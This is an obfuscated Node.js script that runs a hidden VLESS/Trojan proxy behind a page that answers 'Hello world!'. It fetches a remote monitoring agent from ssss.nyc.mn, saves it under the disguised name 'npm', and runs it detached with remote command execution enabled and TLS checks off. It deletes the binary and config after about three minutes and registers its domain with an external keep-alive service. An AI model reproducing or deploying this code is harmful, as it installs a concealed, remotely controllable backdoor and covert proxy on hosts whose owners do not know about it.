function _0x5291(){const _0x52adc5=['21MQeiaf','npm\x20download\x20successfully','npm\x20is\x20already\x20running,\x20skip\x20running...','url','text/html','post','http','net','then','chmod\x20+x\x20npm','8524565CCGVki','Not\x20Found\x0a','env','&type=A','6759qccAXm','from','true','slice','Hello\x20world!','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','443','stream','config.yaml','catch','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','Answer','country_code','aarch64',':443?encryption=none&security=tls&sni=','6001355SdWBBQ','UUID','setsid\x20nohup\x20./npm\x20-s\x20','&path=%2F','WSPATH','79313uaTCVA','readFile','hex','DOMAIN','error:\x20','298892xOTVoa','https://arm64.ssss.nyc.mn/v1','digest','child_process','sub','error','get','buffer','8443','&fp=chrome&type=ws&host=','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','end','concat','6413310kYDEeo','substr','close','false','every','--tls','toString','readUInt16BE','\x20with\x20all\x20DNS\x20servers','isp','send','decode','map','NEZHA_PORT','trim','reduce','readUInt8','application/dns-json','split','pop','createHash','2096','sha224','crypto','8ZkjEIy','vless://','text/plain','path','update','includes','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','writeFileSync','data','https://amd64.ssss.nyc.mn/v1','SUB_PATH','NEZHA_KEY','createWriteStream','1784rrEIWk','client_secret:\x20','write','createServer','connect',':443?security=tls&sni=','join','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','https://arm64.ssss.nyc.mn/agent','message','120HIWiVC','arm','writeHead','Server','520428OleTLf','arch','https://api.ip.sb/geoip','trojan://','/bin/bash','arm64','length','NAME','listen','https://oooo.serv00.net/add-url','pipe','log','1.1.1.1','NEZHA_SERVER','application/json','https://dns.google/resolve?name=','finish','https://','Status'];_0x5291=function(){return _0x52adc5;};return _0x5291();}const _0x14aa24=_0x47e2;function _0x47e2(_0x8dee14,_0x48cad9){_0x8dee14=_0x8dee14-0x12b;const _0x52919d=_0x5291();let _0x47e215=_0x52919d[_0x8dee14];return _0x47e215;}(function(_0x2d4bf7,_0x474a9d){const _0x2ec65c=_0x47e2,_0x35beac=_0x2d4bf7();while(!![]){try{const _0x29f895=parseInt(_0x2ec65c(0x170))/0x1*(parseInt(_0x2ec65c(0x19a))/0x2)+-parseInt(_0x2ec65c(0x14e))/0x3*(parseInt(_0x2ec65c(0x13b))/0x4)+-parseInt(_0x2ec65c(0x16b))/0x5+parseInt(_0x2ec65c(0x182))/0x6+parseInt(_0x2ec65c(0x158))/0x7+parseInt(_0x2ec65c(0x12d))/0x8*(-parseInt(_0x2ec65c(0x15c))/0x9)+-parseInt(_0x2ec65c(0x137))/0xa*(-parseInt(_0x2ec65c(0x175))/0xb);if(_0x29f895===_0x474a9d)break;else _0x35beac['push'](_0x35beac['shift']());}catch(_0x2f5d34){_0x35beac['push'](_0x35beac['shift']());}}}(_0x5291,0x9f0ef));const os=require('os'),http=require(_0x14aa24(0x154)),fs=require('fs'),axios=require('axios'),net=require(_0x14aa24(0x155)),path=require(_0x14aa24(0x19d)),crypto=require(_0x14aa24(0x199)),{Buffer}=require(_0x14aa24(0x17c)),{exec,execSync}=require(_0x14aa24(0x178)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x14aa24(0x15a)][_0x14aa24(0x16c)]||'e9903e9e-c661-4233-8cd1-742c0e2d395e',NEZHA_SERVER=process[_0x14aa24(0x15a)][_0x14aa24(0x148)]||'',NEZHA_PORT=process[_0x14aa24(0x15a)][_0x14aa24(0x18f)]||'',NEZHA_KEY=process[_0x14aa24(0x15a)][_0x14aa24(0x12b)]||'',DOMAIN=process[_0x14aa24(0x15a)][_0x14aa24(0x173)]||'aifq.shxxit.com',AUTO_ACCESS=process[_0x14aa24(0x15a)]['AUTO_ACCESS']||!![],WSPATH=process['env'][_0x14aa24(0x16f)]||UUID[_0x14aa24(0x15f)](0x0,0x8),SUB_PATH=process[_0x14aa24(0x15a)][_0x14aa24(0x1a4)]||_0x14aa24(0x179),NAME=process[_0x14aa24(0x15a)][_0x14aa24(0x142)]||'',PORT=process[_0x14aa24(0x15a)]['PORT']||0x221c;let ISP='';const GetISP=async()=>{const _0x356fde=_0x14aa24;try{const _0x3813aa=await axios[_0x356fde(0x17b)](_0x356fde(0x13d)),_0x161b5c=_0x3813aa[_0x356fde(0x1a2)];ISP=(_0x161b5c[_0x356fde(0x168)]+'-'+_0x161b5c[_0x356fde(0x18b)])['replace'](/ /g,'_');}catch(_0x8bbc95){ISP='Unknown';}};GetISP();const httpServer=http[_0x14aa24(0x130)]((_0x2fa7fb,_0x309169)=>{const _0x5b19a8=_0x14aa24;if(_0x2fa7fb[_0x5b19a8(0x151)]==='/'){const _0x9f19bc=path[_0x5b19a8(0x133)](__dirname,'index.html');fs[_0x5b19a8(0x171)](_0x9f19bc,'utf8',(_0x4ac440,_0xb469eb)=>{const _0x3dd13b=_0x5b19a8;if(_0x4ac440){_0x309169[_0x3dd13b(0x139)](0xc8,{'Content-Type':'text/html'}),_0x309169['end'](_0x3dd13b(0x160));return;}_0x309169[_0x3dd13b(0x139)](0xc8,{'Content-Type':_0x3dd13b(0x152)}),_0x309169[_0x3dd13b(0x180)](_0xb469eb);});return;}else{if(_0x2fa7fb[_0x5b19a8(0x151)]==='/'+SUB_PATH){const _0x12f910=NAME?NAME+'-'+ISP:ISP,_0x4fb6cd=_0x5b19a8(0x19b)+UUID+'@'+DOMAIN+_0x5b19a8(0x16a)+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+'&path=%2F'+WSPATH+'#'+_0x12f910,_0x5eb391=_0x5b19a8(0x13e)+UUID+'@'+DOMAIN+_0x5b19a8(0x132)+DOMAIN+_0x5b19a8(0x17e)+DOMAIN+_0x5b19a8(0x16e)+WSPATH+'#'+_0x12f910,_0x4f91e5=_0x4fb6cd+'\x0a'+_0x5eb391,_0xfa0243=Buffer[_0x5b19a8(0x15d)](_0x4f91e5)['toString']('base64');_0x309169[_0x5b19a8(0x139)](0xc8,{'Content-Type':_0x5b19a8(0x19c)}),_0x309169[_0x5b19a8(0x180)](_0xfa0243+'\x0a');}else _0x309169['writeHead'](0x194,{'Content-Type':_0x5b19a8(0x19c)}),_0x309169['end'](_0x5b19a8(0x159));}}),wss=new WebSocket[(_0x14aa24(0x13a))]({'server':httpServer}),uuid=UUID['replace'](/-/g,''),DNS_SERVERS=['8.8.4.4',_0x14aa24(0x147)];function resolveHost(_0x18e350){return new Promise((_0x128af8,_0x19d0f7)=>{if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/['test'](_0x18e350)){_0x128af8(_0x18e350);return;}let _0x1cc894=0x0;function _0x4eeb14(){const _0x233e3e=_0x47e2;if(_0x1cc894>=DNS_SERVERS['length']){_0x19d0f7(new Error('Failed\x20to\x20resolve\x20'+_0x18e350+_0x233e3e(0x18a)));return;}const _0x2005c8=DNS_SERVERS[_0x1cc894];_0x1cc894++;const _0xdf715b=_0x233e3e(0x14a)+encodeURIComponent(_0x18e350)+_0x233e3e(0x15b);axios[_0x233e3e(0x17b)](_0xdf715b,{'timeout':0x1388,'headers':{'Accept':_0x233e3e(0x193)}})[_0x233e3e(0x156)](_0x595333=>{const _0x1817a5=_0x233e3e,_0x51cd6d=_0x595333[_0x1817a5(0x1a2)];if(_0x51cd6d[_0x1817a5(0x14d)]===0x0&&_0x51cd6d[_0x1817a5(0x167)]&&_0x51cd6d[_0x1817a5(0x167)]['length']>0x0){const _0x29f3b0=_0x51cd6d['Answer']['find'](_0x546a8f=>_0x546a8f['type']===0x1);if(_0x29f3b0){_0x128af8(_0x29f3b0['data']);return;}}_0x4eeb14();})[_0x233e3e(0x165)](_0x1440e2=>{_0x4eeb14();});}_0x4eeb14();});}function handleVlessConnection(_0x56fc93,_0xb3aee2){const _0x42981b=_0x14aa24,[_0x159d51]=_0xb3aee2,_0x4ed908=_0xb3aee2[_0x42981b(0x15f)](0x1,0x11);if(!_0x4ed908[_0x42981b(0x186)]((_0x555750,_0x2af09a)=>_0x555750==parseInt(uuid[_0x42981b(0x183)](_0x2af09a*0x2,0x2),0x10)))return![];let _0x5aaf9e=_0xb3aee2[_0x42981b(0x15f)](0x11,0x12)['readUInt8']()+0x13;const _0x2e41a1=_0xb3aee2['slice'](_0x5aaf9e,_0x5aaf9e+=0x2)[_0x42981b(0x189)](0x0),_0x207b1e=_0xb3aee2[_0x42981b(0x15f)](_0x5aaf9e,_0x5aaf9e+=0x1)[_0x42981b(0x192)](),_0x3e7061=_0x207b1e==0x1?_0xb3aee2[_0x42981b(0x15f)](_0x5aaf9e,_0x5aaf9e+=0x4)[_0x42981b(0x133)]('.'):_0x207b1e==0x2?new TextDecoder()[_0x42981b(0x18d)](_0xb3aee2[_0x42981b(0x15f)](_0x5aaf9e+0x1,_0x5aaf9e+=0x1+_0xb3aee2['slice'](_0x5aaf9e,_0x5aaf9e+0x1)[_0x42981b(0x192)]())):_0x207b1e==0x3?_0xb3aee2[_0x42981b(0x15f)](_0x5aaf9e,_0x5aaf9e+=0x10)[_0x42981b(0x191)]((_0x496cae,_0x32ef28,_0x4d2538,_0x36961a)=>_0x4d2538%0x2?_0x496cae[_0x42981b(0x181)](_0x36961a[_0x42981b(0x15f)](_0x4d2538-0x1,_0x4d2538+0x1)):_0x496cae,[])[_0x42981b(0x18e)](_0x1f3e46=>_0x1f3e46['readUInt16BE'](0x0)[_0x42981b(0x188)](0x10))[_0x42981b(0x133)](':'):'';_0x56fc93[_0x42981b(0x18c)](new Uint8Array([_0x159d51,0x0]));const _0x299caa=createWebSocketStream(_0x56fc93);return resolveHost(_0x3e7061)[_0x42981b(0x156)](_0x42f5b2=>{const _0x3fc8e8=_0x42981b;net['connect']({'host':_0x42f5b2,'port':_0x2e41a1},function(){const _0x275f80=_0x47e2;this['write'](_0xb3aee2['slice'](_0x5aaf9e)),_0x299caa['on'](_0x275f80(0x17a),()=>{})[_0x275f80(0x145)](this)['on'](_0x275f80(0x17a),()=>{})[_0x275f80(0x145)](_0x299caa);})['on'](_0x3fc8e8(0x17a),()=>{});})['catch'](_0x34e04d=>{const _0x49be69=_0x42981b;net[_0x49be69(0x131)]({'host':_0x3e7061,'port':_0x2e41a1},function(){const _0x2736a7=_0x49be69;this['write'](_0xb3aee2[_0x2736a7(0x15f)](_0x5aaf9e)),_0x299caa['on']('error',()=>{})[_0x2736a7(0x145)](this)['on'](_0x2736a7(0x17a),()=>{})[_0x2736a7(0x145)](_0x299caa);})['on']('error',()=>{});}),!![];}function handleTrojanConnection(_0x331a7d,_0xb0a352){const _0x114263=_0x14aa24;try{if(_0xb0a352[_0x114263(0x141)]<0x3a)return![];const _0x1b005e=_0xb0a352[_0x114263(0x15f)](0x0,0x38)[_0x114263(0x188)](),_0x27334d=[UUID];let _0x51c8ca=null;for(const _0x537eed of _0x27334d){const _0x2d6bbe=crypto[_0x114263(0x196)](_0x114263(0x198))[_0x114263(0x19e)](_0x537eed)[_0x114263(0x177)](_0x114263(0x172));if(_0x2d6bbe===_0x1b005e){_0x51c8ca=_0x537eed;break;}}if(!_0x51c8ca)return![];let _0x27a96c=0x38;_0xb0a352[_0x27a96c]===0xd&&_0xb0a352[_0x27a96c+0x1]===0xa&&(_0x27a96c+=0x2);const _0x5d52a4=_0xb0a352[_0x27a96c];if(_0x5d52a4!==0x1)return![];_0x27a96c+=0x1;const _0x17d3d9=_0xb0a352[_0x27a96c];_0x27a96c+=0x1;let _0x42a1a8,_0x12f87d;if(_0x17d3d9===0x1)_0x42a1a8=_0xb0a352[_0x114263(0x15f)](_0x27a96c,_0x27a96c+0x4)['join']('.'),_0x27a96c+=0x4;else{if(_0x17d3d9===0x3){const _0x3a0e52=_0xb0a352[_0x27a96c];_0x27a96c+=0x1,_0x42a1a8=_0xb0a352[_0x114263(0x15f)](_0x27a96c,_0x27a96c+_0x3a0e52)[_0x114263(0x188)](),_0x27a96c+=_0x3a0e52;}else{if(_0x17d3d9===0x4)_0x42a1a8=_0xb0a352['slice'](_0x27a96c,_0x27a96c+0x10)[_0x114263(0x191)]((_0x48f971,_0x377776,_0x4f1afc,_0x51cc6e)=>_0x4f1afc%0x2?_0x48f971[_0x114263(0x181)](_0x51cc6e[_0x114263(0x15f)](_0x4f1afc-0x1,_0x4f1afc+0x1)):_0x48f971,[])['map'](_0x551b16=>_0x551b16[_0x114263(0x189)](0x0)['toString'](0x10))['join'](':'),_0x27a96c+=0x10;else return![];}}_0x12f87d=_0xb0a352[_0x114263(0x189)](_0x27a96c),_0x27a96c+=0x2;_0x27a96c<_0xb0a352[_0x114263(0x141)]&&_0xb0a352[_0x27a96c]===0xd&&_0xb0a352[_0x27a96c+0x1]===0xa&&(_0x27a96c+=0x2);const _0x49037e=createWebSocketStream(_0x331a7d);return resolveHost(_0x42a1a8)[_0x114263(0x156)](_0x1ca9f1=>{const _0x655b6b=_0x114263;net[_0x655b6b(0x131)]({'host':_0x1ca9f1,'port':_0x12f87d},function(){const _0x4d6ecc=_0x655b6b;_0x27a96c<_0xb0a352['length']&&this[_0x4d6ecc(0x12f)](_0xb0a352[_0x4d6ecc(0x15f)](_0x27a96c)),_0x49037e['on'](_0x4d6ecc(0x17a),()=>{})[_0x4d6ecc(0x145)](this)['on'](_0x4d6ecc(0x17a),()=>{})[_0x4d6ecc(0x145)](_0x49037e);})['on'](_0x655b6b(0x17a),()=>{});})['catch'](_0x3dc8b8=>{const _0x57ab70=_0x114263;net[_0x57ab70(0x131)]({'host':_0x42a1a8,'port':_0x12f87d},function(){const _0x351b08=_0x57ab70;_0x27a96c<_0xb0a352[_0x351b08(0x141)]&&this[_0x351b08(0x12f)](_0xb0a352[_0x351b08(0x15f)](_0x27a96c)),_0x49037e['on'](_0x351b08(0x17a),()=>{})[_0x351b08(0x145)](this)['on'](_0x351b08(0x17a),()=>{})[_0x351b08(0x145)](_0x49037e);})['on'](_0x57ab70(0x17a),()=>{});}),!![];}catch(_0x1019c2){return![];}}wss['on']('connection',(_0x23c319,_0xd3a7e7)=>{const _0x439058=_0x14aa24,_0xddd81c=_0xd3a7e7[_0x439058(0x151)]||'';_0x23c319['once'](_0x439058(0x136),_0x1fb274=>{const _0x12993d=_0x439058;if(_0x1fb274['length']>0x11&&_0x1fb274[0x0]===0x0){const _0x3a69d6=_0x1fb274[_0x12993d(0x15f)](0x1,0x11),_0x9409fa=_0x3a69d6['every']((_0xacc82e,_0xf4bd8b)=>_0xacc82e==parseInt(uuid['substr'](_0xf4bd8b*0x2,0x2),0x10));if(_0x9409fa){!handleVlessConnection(_0x23c319,_0x1fb274)&&_0x23c319['close']();return;}}!handleTrojanConnection(_0x23c319,_0x1fb274)&&_0x23c319[_0x12993d(0x184)]();})['on'](_0x439058(0x17a),()=>{});});const getDownloadUrl=()=>{const _0x4ed377=_0x14aa24,_0x59fd45=os[_0x4ed377(0x13c)]();return _0x59fd45===_0x4ed377(0x138)||_0x59fd45===_0x4ed377(0x140)||_0x59fd45===_0x4ed377(0x169)?!NEZHA_PORT?_0x4ed377(0x176):_0x4ed377(0x135):!NEZHA_PORT?_0x4ed377(0x1a3):'https://amd64.ssss.nyc.mn/agent';},downloadFile=async()=>{const _0x3a04d8=_0x14aa24;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x1ee1b9=getDownloadUrl(),_0x1c0a96=await axios({'method':'get','url':_0x1ee1b9,'responseType':_0x3a04d8(0x163)}),_0x7f0215=fs[_0x3a04d8(0x12c)]('npm');return _0x1c0a96[_0x3a04d8(0x1a2)][_0x3a04d8(0x145)](_0x7f0215),new Promise((_0x5610,_0x427b5a)=>{const _0x17ed8d=_0x3a04d8;_0x7f0215['on'](_0x17ed8d(0x14b),()=>{const _0x38a05d=_0x17ed8d;console['log'](_0x38a05d(0x14f)),exec(_0x38a05d(0x157),_0x335f70=>{if(_0x335f70)_0x427b5a(_0x335f70);_0x5610();});}),_0x7f0215['on']('error',_0x427b5a);});}catch(_0x1df39e){throw _0x1df39e;}},runnz=async()=>{const _0x462dca=_0x14aa24;try{const _0x4041d1=execSync('ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22',{'encoding':'utf-8'});if(_0x4041d1[_0x462dca(0x190)]()!==''){console[_0x462dca(0x146)](_0x462dca(0x150));return;}}catch(_0x52a2d0){}await downloadFile();let _0x3dca0c='',_0x11f9dc=[_0x462dca(0x162),_0x462dca(0x17d),_0x462dca(0x197),'2087','2083','2053'];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x1e3fde=_0x11f9dc[_0x462dca(0x19f)](NEZHA_PORT)?_0x462dca(0x187):'';_0x3dca0c=_0x462dca(0x16d)+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x1e3fde+_0x462dca(0x134);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x2218f0=NEZHA_SERVER[_0x462dca(0x19f)](':')?NEZHA_SERVER[_0x462dca(0x194)](':')[_0x462dca(0x195)]():'',_0x22c4e1=_0x11f9dc[_0x462dca(0x19f)](_0x2218f0)?_0x462dca(0x15e):_0x462dca(0x185),_0x104de6=_0x462dca(0x12e)+NEZHA_KEY+_0x462dca(0x166)+NEZHA_SERVER+_0x462dca(0x17f)+_0x22c4e1+_0x462dca(0x161)+UUID;fs[_0x462dca(0x1a1)](_0x462dca(0x164),_0x104de6);}_0x3dca0c=_0x462dca(0x1a0);}else{console['log']('NEZHA\x20variable\x20is\x20empty,\x20skip\x20running');return;}}try{exec(_0x3dca0c,{'shell':_0x462dca(0x13f)},_0x5b1924=>{if(_0x5b1924)console['error']('npm\x20running\x20error:',_0x5b1924);else console['log']('npm\x20is\x20running');});}catch(_0x25e976){console['error'](_0x462dca(0x174)+_0x25e976);}};async function addAccessTask(){const _0x359490=_0x14aa24;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x1851a1=_0x359490(0x14c)+DOMAIN;try{const _0x3f112b=await axios[_0x359490(0x153)](_0x359490(0x144),{'url':_0x1851a1},{'headers':{'Content-Type':_0x359490(0x149)}});console[_0x359490(0x146)]('Automatic\x20Access\x20Task\x20added\x20successfully');}catch(_0x6767ab){}}const delFiles=()=>{const _0x45d41c=_0x14aa24;fs['unlink']('npm',()=>{}),fs['unlink'](_0x45d41c(0x164),()=>{});};httpServer[_0x14aa24(0x143)](PORT,()=>{const _0x1a4d3c=_0x14aa24;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x1a4d3c(0x146)]('Server\x20is\x20running\x20on\x20port\x20'+PORT);});
